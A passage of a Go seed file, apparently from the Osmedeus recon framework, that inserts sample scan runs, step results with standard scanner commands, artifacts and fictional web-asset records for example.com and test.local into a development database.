package database

import (
	"context"
	"fmt"
	"time"

	"github.com/google/uuid"
	"github.com/uptrace/bun"
)

// SeedDatabase populates the database with sample data for development and testing
func SeedDatabase(ctx context.Context) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	// Generate unique IDs
	scan1ID := uuid.New().String()
	scan2ID := uuid.New().String()
	scan3ID := uuid.New().String()

	now := time.Now()
	oneHourAgo := now.Add(-1 * time.Hour)
	twoHoursAgo := now.Add(-2 * time.Hour)
	thirtyMinsAgo := now.Add(-30 * time.Minute)

	// Seed Runs
	runs := []Run{
		{
			ID:             scan1ID,
			RunID:          fmt.Sprintf("run-%s", scan1ID[:8]),
			WorkflowName:   "subdomain-enum",
			WorkflowKind:   "module",
			Target:         "example.com",
			Params:         map[string]interface{}{"threads": 10, "timeout": 300},
			Status:         "completed",
			WorkspacePath:  "/home/osmedeus/workspaces-osmedeus/example.com",
			StartedAt:      &twoHoursAgo,
			CompletedAt:    &oneHourAgo,
			TriggerType:    "manual",
			TotalSteps:     5,
			CompletedSteps: 5,
			CreatedAt:      twoHoursAgo,
			UpdatedAt:      oneHourAgo,
		},
		{
			ID:             scan2ID,
			RunID:          fmt.Sprintf("run-%s", scan2ID[:8]),
			WorkflowName:   "port-scan",
			WorkflowKind:   "module",
			Target:         "api.example.com",
			Params:         map[string]interface{}{"ports": "1-10000", "rate": 1000},
			Status:         "running",
			WorkspacePath:  "/home/osmedeus/workspaces-osmedeus/api.example.com",
			StartedAt:      &thirtyMinsAgo,
			TriggerType:    "cron",
			TriggerName:    "daily-recon",
			TotalSteps:     4,
			CompletedSteps: 2,
			CreatedAt:      thirtyMinsAgo,
			UpdatedAt:      now,
		},
		{
			ID:             scan3ID,
			RunID:          fmt.Sprintf("run-%s", scan3ID[:8]),
			WorkflowName:   "vuln-scan",
			WorkflowKind:   "flow",
			Target:         "staging.test.local",
			Params:         map[string]interface{}{"severity": "critical,high", "templates": "cves"},
			Status:         "failed",
			WorkspacePath:  "/home/osmedeus/workspaces-osmedeus/staging.test.local",
			StartedAt:      &twoHoursAgo,
			CompletedAt:    &oneHourAgo,
			ErrorMessage:   "nuclei: template loading failed: connection timeout",
			TriggerType:    "manual",
			TotalSteps:     6,
			CompletedSteps: 3,
			CreatedAt:      twoHoursAgo,
			UpdatedAt:      oneHourAgo,
		},
	}

	for _, run := range runs {
		if _, err := db.NewInsert().Model(&run).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert run: %w", err)
		}
	}

	// Seed StepResults
	stepResults := []StepResult{
		// Run 1 steps (subdomain-enum - completed)
		{
			ID:          uuid.New().String(),
			RunID:       scan1ID,
			StepName:    "subfinder",
			StepType:    "bash",
			Status:      "completed",
			Command:     "subfinder -d example.com -o {{Output}}/subdomain/sources/subfinder.txt",
			Output:      "Found 47 subdomains",
			Exports:     map[string]interface{}{"subfinder_output": "{{Output}}/subdomain/sources/subfinder.txt"},
			DurationMs:  45000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/example.com/logs/subfinder.log",
			StartedAt:   &twoHoursAgo,
			CompletedAt: timePtr(twoHoursAgo.Add(45 * time.Second)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:          uuid.New().String(),
			RunID:       scan1ID,
			StepName:    "amass",
			StepType:    "bash",
			Status:      "completed",
			Command:     "amass enum -passive -d example.com -o {{Output}}/subdomain/sources/amass.txt",
			Output:      "Found 82 subdomains",
			Exports:     map[string]interface{}{"amass_output": "{{Output}}/subdomain/sources/amass.txt"},
			DurationMs:  120000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/example.com/logs/amass.log",
			StartedAt:   timePtr(twoHoursAgo.Add(45 * time.Second)),
			CompletedAt: timePtr(twoHoursAgo.Add(165 * time.Second)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:          uuid.New().String(),
			RunID:       scan1ID,
			StepName:    "merge-subdomains",
			StepType:    "function",
			Status:      "completed",
			Command:     "SortUnique('{{Output}}/subdomain/sources/*.txt', '{{Output}}/subdomain/final-subdomains.txt')",
			Output:      "Merged 112 unique subdomains",
			Exports:     map[string]interface{}{"subdomains": "{{Output}}/subdomain/final-subdomains.txt"},
			DurationMs:  500,
			StartedAt:   timePtr(twoHoursAgo.Add(165 * time.Second)),
			CompletedAt: timePtr(twoHoursAgo.Add(166 * time.Second)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:          uuid.New().String(),
			RunID:       scan1ID,
			StepName:    "httpx",
			StepType:    "bash",
			Status:      "completed",
			Command:     "httpx -l {{subdomains}} -json -o {{Output}}/http/httpx-output.json",
			Output:      "Probed 112 hosts, 78 alive",
			Exports:     map[string]interface{}{"httpx_output": "{{Output}}/http/httpx-output.json"},
			DurationMs:  180000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/example.com/logs/httpx.log",
			StartedAt:   timePtr(twoHoursAgo.Add(166 * time.Second)),
			CompletedAt: timePtr(twoHoursAgo.Add(346 * time.Second)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:          uuid.New().String(),
			RunID:       scan1ID,
			StepName:    "screenshot",
			StepType:    "bash",
			Status:      "completed",
			Command:     "gowitness file -f {{Output}}/http/alive-hosts.txt -P {{Output}}/screenshots/",
			Output:      "Captured 78 screenshots",
			DurationMs:  300000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/example.com/logs/gowitness.log",
			StartedAt:   timePtr(twoHoursAgo.Add(346 * time.Second)),
			CompletedAt: &oneHourAgo,
			CreatedAt:   twoHoursAgo,
		},
		// Run 2 steps (port-scan - running)
		{
			ID:          uuid.New().String(),
			RunID:       scan2ID,
			StepName:    "masscan",
			StepType:    "bash",
			Status:      "completed",
			Command:     "masscan -p1-10000 --rate=1000 -iL {{targets}} -oG {{Output}}/ports/masscan.txt",
			Output:      "Scanned 1 host, found 23 open ports",
			DurationMs:  600000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/api.example.com/logs/masscan.log",
			StartedAt:   &thirtyMinsAgo,
			CompletedAt: timePtr(thirtyMinsAgo.Add(10 * time.Minute)),
			CreatedAt:   thirtyMinsAgo,
		},
		{
			ID:         uuid.New().String(),
			RunID:      scan2ID,
			StepName:   "nmap-service-scan",
			StepType:   "bash",
			Status:     "running",
			Command:    "nmap -sV -sC -p{{ports}} -iL {{targets}} -oA {{Output}}/ports/nmap-services",
			DurationMs: 0,
			LogFile:    "/home/osmedeus/workspaces-osmedeus/api.example.com/logs/nmap.log",
			StartedAt:  timePtr(thirtyMinsAgo.Add(10 * time.Minute)),
			CreatedAt:  thirtyMinsAgo,
		},
		// Run 3 steps (vuln-scan - failed)
		{
			ID:          uuid.New().String(),
			RunID:       scan3ID,
			StepName:    "prepare-targets",
			StepType:    "function",
			Status:      "completed",
			Command:     "ReadFile('{{Input}}')",
			Output:      "Loaded 15 targets",
			DurationMs:  100,
			StartedAt:   &twoHoursAgo,
			CompletedAt: timePtr(twoHoursAgo.Add(100 * time.Millisecond)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan3ID,
			StepName:     "nuclei",
			StepType:     "bash",
			Status:       "failed",
			Command:      "nuclei -l {{targets}} -severity critical,high -t cves/ -o {{Output}}/vuln/nuclei.txt",
			ErrorMessage: "template loading failed: connection timeout",
			DurationMs:   30000,
			LogFile:      "/home/osmedeus/workspaces-osmedeus/staging.test.local/logs/nuclei.log",
			StartedAt:    timePtr(twoHoursAgo.Add(100 * time.Millisecond)),
			CompletedAt:  timePtr(twoHoursAgo.Add(30 * time.Second)),
			CreatedAt:    twoHoursAgo,
		},
		// Additional steps for scan2ID (port-scan)
		{
			ID:          uuid.New().String(),
			RunID:       scan2ID,
			StepName:    "port-filter",
			StepType:    "function",
			Status:      "completed",
			Command:     "FilterPorts('{{Output}}/ports/masscan.txt', '{{Output}}/ports/filtered-ports.txt', 'common')",
			Output:      "Filtered to 15 common service ports",
			Exports:     map[string]interface{}{"filtered_ports": "{{Output}}/ports/filtered-ports.txt"},
			DurationMs:  200,
			StartedAt:   timePtr(thirtyMinsAgo.Add(10*time.Minute + 30*time.Second)),
			CompletedAt: timePtr(thirtyMinsAgo.Add(10*time.Minute + 31*time.Second)),
			CreatedAt:   thirtyMinsAgo,
		},
		{
			ID:         uuid.New().String(),
			RunID:      scan2ID,
			StepName:   "banner-grab",
			StepType:   "bash",
			Status:     "pending",
			Command:    "zgrab2 multiple -c {{Output}}/ports/zgrab-config.ini -o {{Output}}/ports/banners.json",
			DurationMs: 0,
			LogFile:    "/home/osmedeus/workspaces-osmedeus/api.example.com/logs/zgrab.log",
			CreatedAt:  thirtyMinsAgo,
		},
		// Additional steps for scan3ID (vuln-scan - some completed before failure)
		{
			ID:          uuid.New().String(),
			RunID:       scan3ID,
			StepName:    "validate-targets",
			StepType:    "function",
			Status:      "completed",
			Command:     "ValidateURLs('{{Input}}')",
			Output:      "Validated 15 URLs, 12 reachable",
			Exports:     map[string]interface{}{"valid_targets": "{{Output}}/valid-targets.txt"},
			DurationMs:  5000,
			StartedAt:   timePtr(twoHoursAgo.Add(50 * time.Millisecond)),
			CompletedAt: timePtr(twoHoursAgo.Add(5050 * time.Millisecond)),
			CreatedAt:   twoHoursAgo,
		},
		{
			ID:          uuid.New().String(),
			RunID:       scan3ID,
			StepName:    "load-templates",
			StepType:    "bash",
			Status:      "completed",
			Command:     "nuclei -ut",
			Output:      "Templates updated: 4523 total",
			DurationMs:  15000,
			LogFile:     "/home/osmedeus/workspaces-osmedeus/staging.test.local/logs/nuclei-update.log",
			StartedAt:   timePtr(twoHoursAgo.Add(5050 * time.Millisecond)),
			CompletedAt: timePtr(twoHoursAgo.Add(20050 * time.Millisecond)),
			CreatedAt:   twoHoursAgo,
		},
	}

	for _, step := range stepResults {
		if _, err := db.NewInsert().Model(&step).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert step result: %w", err)
		}
	}

	// Seed Artifacts
	artifacts := []Artifact{
		{
			ID:           uuid.New().String(),
			RunID:        scan1ID,
			Workspace:    "example.com",
			Name:         "final-subdomains.txt",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/example.com/subdomain/final-subdomains.txt",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeText,
			SizeBytes:    2847,
			LineCount:    112,
			Description:  "Merged unique subdomains from all sources",
			CreatedAt:    oneHourAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan1ID,
			Workspace:    "example.com",
			Name:         "alive-hosts.txt",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/example.com/http/alive-hosts.txt",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeText,
			SizeBytes:    1956,
			LineCount:    78,
			Description:  "HTTP-responsive hosts from httpx probe",
			CreatedAt:    oneHourAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan1ID,
			Workspace:    "example.com",
			Name:         "httpx-output.json",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/example.com/http/httpx-output.json",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeJSON,
			SizeBytes:    156789,
			LineCount:    78,
			Description:  "Full httpx probe results with headers and tech detection",
			CreatedAt:    oneHourAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan2ID,
			Workspace:    "api.example.com",
			Name:         "masscan.txt",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/api.example.com/ports/masscan.txt",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeText,
			SizeBytes:    892,
			LineCount:    23,
			Description:  "Open ports discovered by masscan",
			CreatedAt:    thirtyMinsAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan1ID,
			Workspace:    "example.com",
			Name:         "screenshots",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/example.com/screenshots/",
			ArtifactType: ArtifactTypeScreenshot,
			ContentType:  ContentTypeFolder,
			SizeBytes:    15728640,
			LineCount:    78,
			Description:  "GoWitness screenshot captures",
			CreatedAt:    oneHourAgo,
		},
		// Additional artifacts for scan2ID (port-scan)
		{
			ID:           uuid.New().String(),
			RunID:        scan2ID,
			Workspace:    "api.example.com",
			Name:         "nmap-services.xml",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/api.example.com/ports/nmap-services.xml",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeUnknown,
			SizeBytes:    45678,
			LineCount:    890,
			Description:  "Nmap service detection XML output with version info",
			CreatedAt:    thirtyMinsAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan2ID,
			Workspace:    "api.example.com",
			Name:         "port-summary.csv",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/api.example.com/ports/port-summary.csv",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeUnknown,
			SizeBytes:    1234,
			LineCount:    24,
			Description:  "Summary of open ports with service names",
			CreatedAt:    thirtyMinsAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan2ID,
			Workspace:    "api.example.com",
			Name:         "targets.txt",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/api.example.com/targets.txt",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeText,
			SizeBytes:    156,
			LineCount:    5,
			Description:  "Input target IPs for port scanning",
			CreatedAt:    thirtyMinsAgo,
		},
		// Artifacts for scan3ID (vuln-scan - failed but has some outputs)
		{
			ID:           uuid.New().String(),
			RunID:        scan3ID,
			Workspace:    "staging.test.local",
			Name:         "nuclei-partial.json",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/staging.test.local/vuln/nuclei-partial.json",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeJSON,
			SizeBytes:    8923,
			LineCount:    45,
			Description:  "Partial nuclei results before failure",
			CreatedAt:    twoHoursAgo,
		},
		{
			ID:           uuid.New().String(),
			RunID:        scan3ID,
			Workspace:    "staging.test.local",
			Name:         "targets-prepared.txt",
			ArtifactPath: "/home/osmedeus/workspaces-osmedeus/staging.test.local/targets-prepared.txt",
			ArtifactType: ArtifactTypeOutput,
			ContentType:  ContentTypeText,
			SizeBytes:    345,
			LineCount:    15,
			Description:  "Prepared target list for vulnerability scanning",
			CreatedAt:    twoHoursAgo,
		},
	}

	for _, artifact := range artifacts {
		if _, err := db.NewInsert().Model(&artifact).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert artifact: %w", err)
		}
	}

	// Seed Assets
	assets := []Asset{
		{
			Workspace:     "example.com",
			AssetValue:    "example.com",
			URL:           "https://example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 12567,
			Title:         "Example Domain",
			Words:         234,
			Lines:         89,
			HostIP:        "93.184.216.34",
			DnsRecords:    []string{"93.184.216.34"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Nginx", "CloudFlare"},
			ResponseTime:  "145ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "www.example.com",
			URL:           "https://www.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    301,
			ContentType:   "text/html",
			ContentLength: 162,
			Title:         "301 Moved Permanently",
			HostIP:        "93.184.216.34",
			DnsRecords:    []string{"93.184.216.34"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Nginx"},
			ResponseTime:  "98ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "api.example.com",
			URL:           "https://api.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "application/json",
			ContentLength: 45,
			Title:         "",
			HostIP:        "93.184.216.35",
			DnsRecords:    []string{"93.184.216.35"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Express", "Node.js"},
			ResponseTime:  "67ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "admin.example.com",
			URL:           "https://admin.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    403,
			ContentType:   "text/html",
			ContentLength: 548,
			Title:         "403 Forbidden",
			HostIP:        "93.184.216.36",
			DnsRecords:    []string{"93.184.216.36"},
			TLS:           "TLS 1.2",
			Technologies:  []string{"Apache", "ModSecurity"},
			ResponseTime:  "234ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "mail.example.com",
			URL:           "https://mail.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 8923,
			Title:         "Webmail Login",
			HostIP:        "93.184.216.37",
			DnsRecords:    []string{"93.184.216.37"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Roundcube", "PHP"},
			ResponseTime:  "312ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "blog.example.com",
			URL:           "https://blog.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 45678,
			Title:         "Example Blog - Tech Insights",
			Words:         1234,
			Lines:         456,
			HostIP:        "93.184.216.38",
			DnsRecords:    []string{"93.184.216.38"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"WordPress", "PHP", "MySQL"},
			ResponseTime:  "456ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "dev.example.com",
			URL:           "http://dev.example.com/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 2345,
			Title:         "Development Server",
			HostIP:        "10.0.0.50",
			DnsRecords:    []string{"10.0.0.50"},
			Technologies:  []string{"Python", "Flask", "Gunicorn"},
			ResponseTime:  "23ms",
			Labels:        "Internal development server - no TLS",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "staging.example.com",
			URL:           "https://staging.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    401,
			ContentType:   "text/html",
			ContentLength: 234,
			Title:         "Authentication Required",
			HostIP:        "93.184.216.40",
			DnsRecords:    []string{"93.184.216.40"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Nginx"},
			ResponseTime:  "89ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "cdn.example.com",
			URL:           "https://cdn.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/plain",
			ContentLength: 0,
			HostIP:        "104.16.123.96",
			DnsRecords:    []string{"104.16.123.96", "104.16.124.96"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"CloudFlare CDN"},
			ResponseTime:  "12ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "status.example.com",
			URL:           "https://status.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 5678,
			Title:         "System Status - All Systems Operational",
			Words:         89,
			Lines:         34,
			HostIP:        "93.184.216.42",
			DnsRecords:    []string{"93.184.216.42"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Statuspage.io"},
			ResponseTime:  "156ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		// Additional assets for better testing
		{
			Workspace:     "example.com",
			AssetValue:    "shop.example.com",
			URL:           "https://shop.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 89234,
			Title:         "Example Shop - Online Store",
			Words:         2456,
			Lines:         678,
			HostIP:        "93.184.216.50",
			DnsRecords:    []string{"93.184.216.50"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Shopify", "React", "Node.js"},
			ResponseTime:  "234ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "docs.example.com",
			URL:           "https://docs.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 34567,
			Title:         "Documentation - Example",
			Words:         1890,
			Lines:         456,
			HostIP:        "93.184.216.51",
			DnsRecords:    []string{"93.184.216.51"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Docusaurus", "React", "Algolia"},
			ResponseTime:  "123ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "support.example.com",
			URL:           "https://support.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 23456,
			Title:         "Support Center - Example",
			Words:         567,
			Lines:         189,
			HostIP:        "93.184.216.52",
			DnsRecords:    []string{"93.184.216.52"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Zendesk", "jQuery"},
			ResponseTime:  "189ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "jenkins.example.com",
			URL:           "https://jenkins.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    403,
			ContentType:   "text/html",
			ContentLength: 1234,
			Title:         "Jenkins - Access Denied",
			HostIP:        "10.0.0.100",
			DnsRecords:    []string{"10.0.0.100"},
			TLS:           "TLS 1.2",
			Technologies:  []string{"Jenkins", "Java"},
			ResponseTime:  "67ms",
			Labels:        "Internal CI/CD server",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "gitlab.example.com",
			URL:           "https://gitlab.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    302,
			ContentType:   "text/html",
			ContentLength: 0,
			Title:         "",
			HostIP:        "10.0.0.101",
			DnsRecords:    []string{"10.0.0.101"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"GitLab", "Ruby", "PostgreSQL"},
			ResponseTime:  "45ms",
			Labels:        "Internal Git server - redirects to login",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "grafana.example.com",
			URL:           "https://grafana.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 15678,
			Title:         "Grafana - Monitoring Dashboard",
			Words:         234,
			Lines:         89,
			HostIP:        "10.0.0.102",
			DnsRecords:    []string{"10.0.0.102"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Grafana", "Go"},
			ResponseTime:  "78ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "legacy.example.com",
			URL:           "http://legacy.example.com/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 56789,
			Title:         "Legacy Application",
			Words:         1234,
			Lines:         567,
			HostIP:        "93.184.216.60",
			DnsRecords:    []string{"93.184.216.60"},
			Technologies:  []string{"ASP.NET", "IIS", "jQuery"},
			ResponseTime:  "567ms",
			Labels:        "Legacy system - no TLS",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "beta.example.com",
			URL:           "https://beta.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    500,
			ContentType:   "text/html",
			ContentLength: 234,
			Title:         "Internal Server Error",
			HostIP:        "93.184.216.61",
			DnsRecords:    []string{"93.184.216.61"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Nginx"},
			ResponseTime:  "1234ms",
			Labels:        "Beta environment - currently broken",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "old.example.com",
			URL:           "https://old.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    301,
			ContentType:   "text/html",
			ContentLength: 178,
			Title:         "Moved Permanently",
			HostIP:        "93.184.216.62",
			DnsRecords:    []string{"93.184.216.62"},
			TLS:           "TLS 1.2",
			Technologies:  []string{"Apache"},
			ResponseTime:  "89ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "api-v2.example.com",
			URL:           "https://api-v2.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "application/json",
			ContentLength: 89,
			Title:         "",
			HostIP:        "93.184.216.63",
			DnsRecords:    []string{"93.184.216.63"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"FastAPI", "Python", "uvicorn"},
			ResponseTime:  "34ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "cms.example.com",
			URL:           "https://cms.example.com/admin/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/admin/",
			StatusCode:    401,
			ContentType:   "text/html",
			ContentLength: 456,
			Title:         "Login Required - CMS Admin",
			HostIP:        "93.184.216.64",
			DnsRecords:    []string{"93.184.216.64"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Strapi", "Node.js", "React"},
			ResponseTime:  "156ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "assets.example.com",
			URL:           "https://assets.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/plain",
			ContentLength: 0,
			HostIP:        "104.16.125.96",
			DnsRecords:    []string{"104.16.125.96", "104.16.126.96"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"CloudFlare", "AWS S3"},
			ResponseTime:  "15ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "prometheus.example.com",
			URL:           "https://prometheus.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 8765,
			Title:         "Prometheus Time Series",
			Words:         123,
			Lines:         45,
			HostIP:        "10.0.0.103",
			DnsRecords:    []string{"10.0.0.103"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Prometheus", "Go"},
			ResponseTime:  "56ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "example.com",
			AssetValue:    "kibana.example.com",
			URL:           "https://kibana.example.com/",
			Scheme:        "https",
			Method:        "GET",
			Path:          "/",
			StatusCode:    502,
			ContentType:   "text/html",
			ContentLength: 567,
			Title:         "502 Bad Gateway",
			HostIP:        "10.0.0.104",
			DnsRecords:    []string{"10.0.0.104"},
			TLS:           "TLS 1.3",
			Technologies:  []string{"Nginx"},
			ResponseTime:  "5000ms",
			Labels:        "Elasticsearch backend down",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		// test.local workspace assets
		{
			Workspace:     "test.local",
			AssetValue:    "web.test.local",
			URL:           "http://web.test.local/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 12345,
			Title:         "Test Web Application",
			Words:         456,
			Lines:         123,
			HostIP:        "192.168.1.10",
			DnsRecords:    []string{"192.168.1.10"},
			Technologies:  []string{"Vue.js", "Nginx"},
			ResponseTime:  "12ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "test.local",
			AssetValue:    "db.test.local",
			URL:           "http://db.test.local:8080/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 5678,
			Title:         "phpMyAdmin",
			Words:         234,
			Lines:         89,
			HostIP:        "192.168.1.11",
			DnsRecords:    []string{"192.168.1.11"},
			Technologies:  []string{"phpMyAdmin", "PHP", "Apache"},
			ResponseTime:  "45ms",
			Labels:        "Database admin panel",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "test.local",
			AssetValue:    "redis.test.local",
			URL:           "http://redis.test.local:8081/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 3456,
			Title:         "Redis Commander",
			Words:         123,
			Lines:         56,
			HostIP:        "192.168.1.12",
			DnsRecords:    []string{"192.168.1.12"},
